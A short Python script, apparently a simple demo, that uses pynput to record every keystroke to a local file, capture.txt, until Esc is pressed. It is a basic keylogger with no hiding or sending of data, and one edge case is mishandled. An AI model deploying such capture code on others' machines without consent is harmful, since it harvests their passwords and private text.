from pynput import keyboard

def on_press(key):
    f = open('capture.txt','a')
    k = get_key_name(key)

    if k != 'Key.space':
        f.write(k)

    else:
        f.write('\n')

    #print("{} key pressed".format(key))

def on_release(key):
    #print("{} key released".format(key))

    if str(key) == 'Key.esc':
        print("Exitting")
        return False

def get_key_name(key):
    if isinstance(key,keyboard.KeyCode):
        return key.char
    else:
        return str(key)


with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()
    